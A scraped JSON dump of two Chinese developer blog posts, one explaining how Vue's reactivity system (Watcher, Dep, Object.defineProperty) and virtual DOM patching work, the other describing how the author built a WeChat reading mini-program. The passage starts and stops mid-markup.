src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a75c30eebb08d?w=894\u0026amp;h=775\u0026amp;f=png\u0026amp;s=50703\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003carea\u003eMVVM 分层示意图\u003c/p\u003e\n\u003cp\u003eVue 通过【观察者模式】实现了一套响应式系统。观察者模式（也叫发布/订阅模式）会将观察者和被观察的对象严格分离开，当被观察对象的状态发生变化时，所有依赖于它的观察者都将得到通知并自动刷新。举个栗子，用户界面可以作为一个观察者，业务数据是被观察者，用户界面观察业务数据的变化，当数据发生变化时，用户界面就会自动更新。\u003c/p\u003e\n\u003cp\u003e该模式必须包含两个角色：观察者和被观察对象。Vue 定义了一个 \u003ccode\u003eWatcher\u003c/code\u003e 类来创建观察者，定义了一个 \u003ccode\u003eDep\u003c/code\u003e 类来创建被观察对象。 Dep 是 Dependent 的缩写，意思是作为观察者的依赖存在，也就是被观察对象。\u003c/p\u003e\n\u003cp\u003e首先看一下【观察者】 \u003ccode\u003eWatcher\u003c/code\u003e 的定义：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// vue/src/core/observer/watcher.js\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e Dep \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./dep'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e \u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eWatcher\u003c/span\u003e \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(vm) {\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.vm = vm\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.newDeps = []\n        Dep.target = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e// 添加一个观察者，或者说注册一个依赖\u003c/span\u003e\n    addDep(dep) {\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.newDeps.push(dep)\n        \u003cspan class=\"hljs-comment\"\u003e// 在【观察者】收集【被观察者】的同时，【被观察者】也会收集【观察者】\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e// 这好比王八看绿豆对眼儿了，遂互存了电话号码，就有了后来的相识相知\u003c/span\u003e\n        dep.addSub(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e)\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e// 在被观察对象状态发生变化时调用此方法\u003c/span\u003e\n    update() {\n        \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e {vm} = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e// 更新视图\u003c/span\u003e\n        vm._update(vm._render())\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e每一个【观察者】都会收集自己要观察的数据对象(Dep)，当【被观察对象】发生变化时，【被观察对象】会通知【观察者】，【观察者】收到通知后执行 \u003ccode\u003eupdate\u003c/code\u003e 方法更新视图。\u003c/p\u003e\n\u003cp\u003e接下来看一下【被观察者】 \u003ccode\u003eDep\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e \u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eDep\u003c/span\u003e \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e () {\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.subs = []\n    }\n    addSub (sub) {\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.subs.push(sub)\n    }\n    depend () {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (Dep.target) {\n            Dep.target.addDep(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e)\n        }\n    }\n    \u003cspan class=\"hljs-comment\"\u003e// 通知所有对自己有依赖的观察者\u003c/span\u003e\n    notify () {\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e subs = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.subs\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; i \u0026lt; subs.length; i++) {\n            subs[i].update()\n        }\n    }\n}\nDep.target = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e每个【被观察对象】同样会收集依赖自己的【观察者】，当自己发生变化时，就会通知(\u003ccode\u003enotify\u003c/code\u003e)这些观察者 \u003ccode\u003eupdate\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e那么问题来了，\u003cstrong\u003e这两个角色是如何收集对方的呢？又如何得知【被观察者】发生变化了呢？\u003c/strong\u003e 这就用到了并不常用的 \u003ca target=\"_blank\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty\"\u003eObject.defineProperty()\u003c/a\u003e 方法，通过在 JavaScript 对象每个属性描述符的 \u003ccode\u003esetter\u003c/code\u003e 和 \u003ccode\u003egetter\u003c/code\u003e 里做文章，就能实时捕捉 JavaScript 对象的变化。\u003c/p\u003e\n\u003cp\u003e需要注意的是，\u003ccode\u003eObject.defineProperty()\u003c/code\u003e 是 JS 语言本身的一个 API 而不是 Vue 实现的，\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty\"\u003eObject.defineProperty\u003c/a\u003e 是 ES5 中一个无法 shim 的特性，这也是为什么 Vue 不支持 IE8 以及更低版本浏览器的原因。如果想支持 IE8 以及更低版本浏览器怎么办呢？那就只有放弃 Vue，选择 Knockout。更好的解决方案就是直接让 IE8 以及更 low 的家伙见鬼去吧。不过基本上不用担心这个问题了，因为据最新浏览器使用调查报告，IE8 以及更低版本浏览器的市场份额已经微不足道，直接忽略不计就行了。\u003c/p\u003e\n\u003cp\u003e既然 JS 已经支持在对象属性变化时添加自定义处理，Vue 需要做的事就是遍历传入的 \u003ccode\u003edata\u003c/code\u003e 选项，为 \u003ccode\u003edata\u003c/code\u003e 的每个属性设置 \u003ccode\u003esetter\u003c/code\u003e 和 \u003ccode\u003egetter\u003c/code\u003e。这就解决了如何得知【被观察者】发生了变化这个问题。\u003c/p\u003e\n\u003cp\u003e接下来说说这两者是如何收集对方的。【观察者】和【被观察者】就好比单身男和单身女，得有人安排相亲才能建立起联系呵，Vue 就是这个牵线搭桥的媒婆。下面是相亲源码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// vue/src/core/observer/index.js\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e Dep \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./dep'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eobserve\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eobj\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e keys = \u003cspan class=\"hljs-built_in\"\u003eObject\u003c/span\u003e.keys(obj)\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; i \u0026lt; keys.length; i++) {\n        \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e key = keys[i], value = obj[key];\n        \u003cspan class=\"hljs-comment\"\u003e// 深度优先遍历\u003c/span\u003e\n        observe(value)\n\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e dep = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Dep()\n        \u003cspan class=\"hljs-built_in\"\u003eObject\u003c/span\u003e.defineProperty(obj, key, {\n            \u003cspan class=\"hljs-attr\"\u003eenumerable\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n            \u003cspan class=\"hljs-attr\"\u003econfigurable\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n            get() {\n                \u003cspan class=\"hljs-comment\"\u003e// 【观察者】收集【被观察者】\u003c/span\u003e\n                \u003cspan class=\"hljs-comment\"\u003e// 同时【被观察者】也会收集【观察者】\u003c/span\u003e\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (Dep.target) {\n                    Dep.target.addDep(dep)\n                }\n                \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e value\n            },\n            set(newVal) {\n                value = newVal\n                \u003cspan class=\"hljs-comment\"\u003e// 【被观察者】通知【观察者】\u003c/span\u003e\n                dep.notify()\n            }\n        })\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以看到，Vue 在遍历 \u003ccode\u003edata\u003c/code\u003e 对象时完成了【观察者】和【被观察对象】彼此之间的收集工作。并且在 \u003ccode\u003edata\u003c/code\u003e 的某字段发生变化时，相应的依赖就会通知【观察者】自己发生了变化，【观察者】就可以做出反应。\u003c/p\u003e\n\u003cp\u003eVue 接下来就会在 \u003ccode\u003einitState()\u003c/code\u003e 中调用 \u003ccode\u003eobserve(vm.$options.data)\u003c/code\u003e，执行之后实例化 Vue 时传入的 \u003ccode\u003edata\u003c/code\u003e 对象就会成为响应式的，当你修改 \u003ccode\u003edata\u003c/code\u003e 对象的数据时（通常是根据用户操作执行对应的业务逻辑），【被观察者】就会通知已收集的所有【观察者】，观察者就会调用自己的 \u003ccode\u003eupdate\u003c/code\u003e 方法，从而更新视图。这基本上就是 Vue 所实现的响应的数据绑定的工作原理。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e挂载到 DOM 节点\u003c/h1\u003e\n\u003cp\u003e在构建完响应式系统之后，Vue 接下来会检查用户是否传入了 \u003ccode\u003eel\u003c/code\u003e 选项，因为 Vue 在将包含指令的 HTML 模板编译成最终的朴素的 HTML 之后会执行 DOM 替换操作，最终展示在页面上，如果没有 \u003ccode\u003eel\u003c/code\u003e 选项，Vue 就不知道要把产出的 HTML 放到哪里去展示。\u003c/p\u003e\n\u003cp\u003e挂载到 DOM 节点并非替换一下 DOM 那么简单，它包括将模板编译成 \u003ccode\u003erender\u003c/code\u003e 函数，执行 \u003ccode\u003erender\u003c/code\u003e 函数生成虚拟DOM，计算出新旧虚拟DOM之间的最小变更，打补丁式地更新页面视图等几大步。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e将模板编译成 render 函数\u003c/h2\u003e\n\u003cp\u003e这个编译过程在前几篇的 \u003ca target=\"_blank\" href=\"http://www.cnblogs.com/iovec/p/vue_catalog.html\"\u003eVue 编译器模块\u003c/a\u003e里已经讲得很清楚了，主要分为根据模板生成 AST，对 AST 进行优化，根据 AST 生成 render 函数这三步，这里不再赘述，感兴趣的可\u003ca target=\"_blank\" href=\"http://www.cnblogs.com/iovec/p/vue_catalog.html\"\u003e前往查看\u003c/a\u003e。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e执行 render 函数生成虚拟DOM\u003c/h2\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://www.zhihu.com/question/29504639\"\u003e【虚拟DOM】\u003c/a\u003e并非 Vue 提出的概念，而是老早就被发掘出来的新型DOM操作方式，MVVM 框架在引入虚拟DOM之后如虎添翼。之所以叫做虚拟DOM，是相对于真实DOM而言的。直接操作DOM很慢，因为\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement\"\u003e真实的DOM对象很重\u003c/a\u003e，操作真实DOM对象(HTMLElement)花销很大，而且操作完之后往往会引起\u003ca target=\"_blank\" href=\"http://www.cnblogs.com/iovec/p/7904416.html\"\u003e浏览器对页面的重绘和重排\u003c/a\u003e。如果频繁的进行DOM操作，页面性能会急剧下降。于是聪明的 Jser 决定使用简单的 JS 对象格式来表示真实 DOM，也就是虚拟DOM。先执行对虚拟DOM的操作（这会执行的很快，因为是纯 JS 操作），最后对比操作前后的新旧虚拟DOM树，找出最小变更，一次性地应用到真实DOM上。虽然还是要对真实DOM操作，但次数却大大减少，从而在更新视图的同时可有效保证页面性能。\u003c/p\u003e\n\u003cp\u003eVue 的虚拟DOM系统是在开源虚拟DOM库 \u003ca target=\"_blank\" href=\"https://github.com/snabbdom/snabbdom\"\u003eSnabbdom\u003c/a\u003e 的基础上做了适当的改进。\u003c/p\u003e\n\u003cp\u003e下面是 Vue 的 VNode 定义（正是一个个这样的 VNode 组成了一棵虚拟DOM树）：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// vue/src/core/vdom/vnode.js\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e \u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eVNode\u003c/span\u003e \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e (tag, data, children, text, elm) {\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.tag = tag\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.data = data\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.children = children\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.text = text\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.elm = elm  \u003cspan class=\"hljs-comment\"\u003e// 此字段存放真实DOM\u003c/span\u003e\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e计算出新旧虚拟DOM之间的最小变更\u003c/h2\u003e\n\u003cp\u003e在上一步执行 \u003ccode\u003erender\u003c/code\u003e 函数生成虚拟DOM后，接下来就需要对比新旧虚拟DOM之间的差异，从而获得DOM的最小变更。比较两棵DOM树的差异是虚拟DOM库最核心的部分，这也是所谓的 Virtual DOM 的 diff 算法。就像版本控制系统 Git 的 diff 可以计算出两次提交之间的变更，虚拟DOM的 diff 也可以计算出新旧虚拟DOM之间的差异。计算出来的差异称为一个 \u003cstrong\u003epatch\u003c/strong\u003e，也就是补丁。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e打补丁式更新页面视图\u003c/h2\u003e\n\u003cp\u003e如果是首次渲染，也就是页面刚加载进来第一次渲染，Vue 会用模板编译后的DOM替换掉传入的 \u003ccode\u003eel\u003c/code\u003e 元素。请注意这一点，对模板内DOM的操作（绑定事件，引用DOM等）应该始终放在 Vue 的 \u003ccode\u003emounted\u003c/code\u003e 之后，否则所有处理都将丢失，因为模板会被替换掉。\u003c/p\u003e\n\u003cp\u003e如果是后续数据发生变化，Vue 就会用打补丁的方式更新视图，尽可能重用现有DOM，将真实的DOM操作减到最少。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e结论\u003c/h1\u003e\n\u003cp\u003e在上面【观察者】 \u003ccode\u003eWatcher\u003c/code\u003e 的定义中 \u003ccode\u003eupdate\u003c/code\u003e 方法里执行视图更新。因此 Vue 运行时的整个工作流程基本上是这样的：\u003c/p\u003e\n\u003carea\u003e\n\u003cp\u003e用户调用 \u003ccode\u003enew Vue(options)\u003c/code\u003e 实例化 Vue，Vue 在 \u003ccode\u003e_init\u003c/code\u003e 方法中初始化相关字段和事件，最重要的，建立起响应式系统，Vue 实例的后续运行重度依赖于此响应式系统。Vue 会新建一个【观察者】，该观察者在创建时会执行 \u003ccode\u003eupdate\u003c/code\u003e 方法首次渲染视图，包含 Vue 指令的模板会被替换成编译后的朴素 HTML。Vue 会遍历传入的 \u003ccode\u003edata\u003c/code\u003e 选项，通过 \u003ccode\u003eObject.defineProperty\u003c/code\u003e 设置 \u003ccode\u003esetter\u003c/code\u003e 和 \u003ccode\u003egetter\u003c/code\u003e 将其变成【被观察对象】。当 \u003ccode\u003edata\u003c/code\u003e 的数据发生变化时，被观察对象就会通知观察者，观察者就会再次调用 \u003ccode\u003eupdate\u003c/code\u003e 方法打补丁式地更新视图。\u003c/p\u003e\n\u003cp\u003e本篇完，将在下一篇中开始深究运行时实现细节。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://www.cnblogs.com/iovec/p/vue_catalog.html\"\u003e大白话 Vue 源码系列目录\u003c/a\u003e\u003c/p\u003e\n\u003carea\u003e\n\u003cp\u003e本系列会以每周一篇的速度持续更新，喜欢的小伙伴记得点关注哦\u003c/p\u003e\n","buildTime":"1514894637.1501","__v":0}
{"_id":{"$oid":"5a4b76348b69bb25d83da3dc"},"id":"5a4704f25188257d7242c2db","author":{"$oid":"5a4b76338b69bb25d83da3cd"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"与你一起写小程序","meta":{"likeCount":0},"tag":["微信小程序"],"comment":[],"shortContent":"最近一段时间在学习怎么写小程序，然后自己利用课外时间，也撸了一个。一直都很喜欢网易蜗牛读书这款App，对于喜爱的事物总是情不自禁的，于是就仿照网易蜗牛读书的App简单做了这款小程序。 1、微信开发者工具 他能帮助我们快速的进行小程序的开发。当然，在开发之前我们还需要拥有一个小程…","content":"\u003cp\u003e最近一段时间在学习怎么写小程序，然后自己利用课外时间，也撸了一个。一直都很喜欢网易蜗牛读书这款App，对于喜爱的事物总是情不自禁的，于是就仿照网易蜗牛读书的App简单做了这款小程序。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e项目地址：\u003ca target=\"_blank\" href=\"https://github.com/Hwj1220/wangyi_reading\"\u003e杳杳飞花/Reading\u003c/a\u003e\u003c/h2\u003e\n\u003ch2 class=\"heading\"\u003e项目预览：\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"img\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a56ca4b5f1dda?w=442\u0026amp;h=651\u0026amp;f=gif\u0026amp;s=4879893\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e项目准备：\u003c/h2\u003e\n\n\u003cp\u003e大家若是感兴趣，可以跟着我一起来做哟^_^\u003c/p\u003e\n\u003cp\u003e☟ 蓝体点击就能跳转到相应页面进行下载或者查看教程\u003c/p\u003e\n\u003cp\u003e1、\u003ca target=\"_blank\" href=\"https://mp.weixin.qq.com/debug/wxadoc/dev/devtools/download.html?t=201715\"\u003e微信开发者工具\u003c/a\u003e   他能帮助我们快速的进行小程序的开发。当然，在开发之前我们还需要拥有一个小程序账号（\u003ca target=\"_blank\" href=\"https://jingyan.baidu.com/article/d7130635decb6a13fdf475d3.html\"\u003e注册教程\u003c/a\u003e），通过账号我们就能够管理自己的小程序了。需要注意的是，只有满了18岁的童鞋们才可以注册。\u003c/p\u003e\n\u003cp\u003e2、\u003ca target=\"_blank\" href=\"https://pan.baidu.com/s/1c1HxXOs\"\u003evs code\u003c/a\u003e （密码：g2g5） 64位系统的，其他版本就自己去搜一下安装包啦。虽然在微信开发者工具里面就能够直接写，但还是喜欢在vs code里面进行coding。这个按大家喜好自由选择哦。\u003c/p\u003e\n\u003cp\u003e3、\u003ca target=\"_blank\" href=\"http://www.iconfont.cn/\"\u003eIconfont-阿里巴巴矢量图标库\u003c/a\u003e 一个阿里爸爸做的开源图库，它不仅有几百个公司的开源图标库，还有各式各样的小图标。有了这个图标库真是大大提高了我们的效率，我们能够根据需要进行图标搜索，还能够设置颜色、大小和图片格式。你想要的基本都有哦~\u003c/p\u003e\n\u003cp\u003e4、\u003ca target=\"_blank\" href=\"https://www.easy-mock.com/\"\u003eEasyMock 简单高效的伪造数据\u003c/a\u003e   用于后台的数据模拟，得到JSON数据，方便开发。\u003c/p\u003e\n\u003cp\u003e5、\u003ca target=\"_blank\" href=\"https://www.w3cschool.cn/weixinapp/9wou1q8j.html\"\u003e微信小程序开发文档\u003c/a\u003e  W3C的这个文档真是超级详细，我们能够在这里查找到微信小程序的API、组件以及一些框架等。\u003c/p\u003e\n\u003cp\u003e另外还使用了一款MarkMan进行测量，但若是追求精准还原的话，还是用PS更细腻。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e项目开发过程：\u003c/h2\u003e\n\u003cp\u003e每一次的开发都是一个成长的过程。在开发过程中，我们会遇到各种问题，这就给了我们一个独立思考的空间，能够锻炼我们解决问题和查询文档的能力。当然，在思考查询之后还可以请教他人、进行探讨，这样往往能够帮助我们快速的找到盲点，甚至能够了解到更多我们忽视的点。和别人的交流也是学习中很重要的一环，所以在此分享了自己小小的一点经验，欢迎一起交流，一起学习。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1、开始项目\u003c/h3\u003e\n\u003cp\u003e在项目开始时，我们首先在 app.json 文件中配置主体界面，设置好tabBar 。在这里我们对小程序设置确定了一个整体的基调。\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\"window\":{\n\"backgroundTextStyle\":\"light\",\n\"navigationBarBackgroundColor\": \"#fff\",\n\"navigationBarTitleText\": \"网易蜗牛读书\",\n\"navigationBarTextStyle\":\"black\"\n  },\n  \"tabBar\":{\n\"color\":\"#999999\",\n\"selectedColor\":\"#444444\",\n\"backgroungColor\":\"#ffffff\",\n\"borderStyle\":\"#e0e0e0\",\n\"list\": [\n  {\n    \"pagePath\":\"pages/leader/leader\",\n    \"iconPath\": \"assets/icons/lingdu.png\",\n    \"selectedIconPath\": \"assets/icons/lingdu_sel.png\",\n    \"text\":\"领读\"\n  },\n  {\n    \"pagePath\":\"pages/stack/stack\",\n    \"iconPath\": \"assets/icons/stack.png\",\n    \"selectedIconPath\": \"assets/icons/stack_sel.png\",\n    \"text\":\"分类\"\n  },\n  {\n    \"pagePath\": \"pages/bookdesk/bookdesk\",\n    \"iconPath\": \"assets/icons/bookdesk.png\",\n    \"selectedIconPath\": \"assets/icons/bookdesk_sel.png\",\n    \"text\":\"书桌\"\n  },\n  {\n    \"pagePath\":\"pages/mine/mine\",\n    \"iconPath\": \"assets/icons/mine.png\",\n    \"selectedIconPath\": \"assets/icons/mine_sel.png\",\n    \"text\":\"我的\"\n  }\n]\n }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e对于 pages 页面，在开发过程中进行过很多次调整。到现在为止觉得还算整洁和便于管理了。在起初，不管是一级页面还是二级页面，我都把它们放在了 pages 目录下。这样一开始还不觉得有什么，可是到后来页面越来越多，要对之前写过的页面进行修改和调整的时候，恍然间发现一堆文件夹，查找起来就觉得眼花缭乱，还要和页面进行配对，非常恼火。于是按照页面不同的级别层次，进行了相应的调整。按照不同的tabBar确定了主体的文件夹，然后各级页面又分别在各自所属层级的目录下。另外对于页面的命名尽量通俗易懂，这样方便自己对各页面进行查看和管理。\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\"pages\":[\n\"pages/index/index\", \n\"pages/leader/leader\",  // 领读人  \n\"pages/leader/stories/stories\", \n\"pages/leader/authors/authors\", \n\"pages/stack/stack\",  // 分类\n\"pages/stack/booklist/booklist\", \n\"pages/stack/booklist/bookdetail/bookdetail\",\n\"pages/bookdesk/bookdesk\",   // 书桌\n\"pages/mine/mine\",   // 我的\n\"pages/mine/news/news\",    \n\"pages/logs/logs\" \n  ],\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"img\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a56c9fdcfdfde?w=347\u0026amp;h=398\u0026amp;f=jpeg\u0026amp;s=7886\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在分类页面下具有多层级的一个页面创建展示：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"img\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a56ca07840ec0?w=388\u0026amp;h=467\u0026amp;f=jpeg\u0026amp;s=15467\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e所以在项目开始时首先思考的就是文件的排版问题，一个合理的结构，能够增强项目的可读性，以后操作和维护也更加方便，能够节约一定的时间。\u003c/p\u003e\n\u003cp\u003e小技巧： 在创建pages页面时，如果我们在微信开发者程序的app.json文件中创建，就会自动的生成相应的文件夹，就不用我们一个一个去创建了。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e2、页面布局和样式\u003c/h3\u003e\n\u003cp\u003e小程序属于轻量级的应用，所以在忠于原App的基础上，对某些页面进行了一些调整。另外，在这里所有的页面都是我切的，可能会有人说很多页面都可以引用第三方框架，没有必要写原生代码。其实都没有错，要看自己写小程序是为了什么。我做这款小程序是为了学习小程序的开发，另外自己的前端之旅还是刚刚开启，所以为了在 coding 中锻炼自己对各种结构的敏感性，加深自己对样式属性的理解，我选择了自己写原生代码。\u003c/p\u003e\n\u003cp\u003e其实第三方框架是非常好的轮子，像微信团队开发的 weui 框架就很好用，它提供了很多的组件，能够让你摆脱切页面的繁琐，减少开发时间。对于 weui 的使用我也不是很熟练，所以在后续的学习中，还会继续修改这个小程序，用不同的方法实现页面。\n另外，在命名时，我使用了BEM规范，这样便于对页面结构的理解，使代码更易读。BEM命名法则给我们提供了一个很好的模板，在命名中就能体现各个元素之间的关系，CSS的命名更加语义化，元素更易读懂。而且独一无二的命名方式，使得代码能够得到更好的复用。\u003c/p\u003e\n\u003cp\u003estack.wxml\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"img\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a56c9fdd568c0?w=712\u0026amp;h=446\u0026amp;f=jpeg\u0026amp;s=24069\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e3、使用 easy-mock 造数据\u003c/h3\u003e\n\u003cp\u003e写完基本样式之后，要思考的就是数据问题。我们开发的页面很少有静态的。我们把数据写在页面中没有任何意义还平白增加了工作量。此时我们就需要模拟后台数据，让这些数据能够通过请求渲染到页面上。easy-mock 就给我们提供了一个很好的平台来造假数据，然后生成URL 通过 wx.request() 方法来获取数据，实现页面加载数据。\u003c/p\u003e\n\u003cp\u003e另外还可以在本地写假数据。今天在阅读别人文章时有看到用require()方式来请求数据的。对于这个不是很懂，通过查询之后才发现这是CommonJS 中的模块实现。实现一项功能的方法有很多种，我觉得我们不能只满足于一种方法，而应该广泛的涉猎，通过对不同方法的学习，让自己的知识储备更庞大。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e项目基本功能：\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e1、小程序启动页面的实现\u003c/h3\u003e\n\u003cp\u003e在这里我使用了setInterval（）和clearInterval（）方法来实现，然后通过switchTab来实现跳转\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ePage({\n  data: {\n    time:3\n  },\n  onLoad: function () {\n    var count = setInterval(()=\u0026gt;{   \n      this.setData({\n        time : this.data.time -1\n      });\n      if(this.data.time == 0) {  \n        wx.switchTab({\n          url:'../leader/leader',\n          complete:function(res) {\n          }\n        })\n        clearInterval(count);\n      }\n    },1000);\n  }\n})\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 class=\"heading\"\u003e2、跳转页面时获取id, 获取不同数据\u003c/h3\u003e\n\u003cp\u003e一开始自己对数据获取还不是很熟练，只能进行简单的单页面渲染。后来通过查文档和摸索，逐渐的能够进行复杂一些的数据获取。另外，在setData时，如果不清楚结构，可以使用console.log(); 方法及时的查看数据结构，一层层的剥开找到我们需要的数据层。\n为了更便于理解，附上两张动图展示，可以发现当我点击不同文章之后，跳转的页面获取的数据也不一样。\u003c/p\u003e\n\u003cp\u003e领读\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"img\" 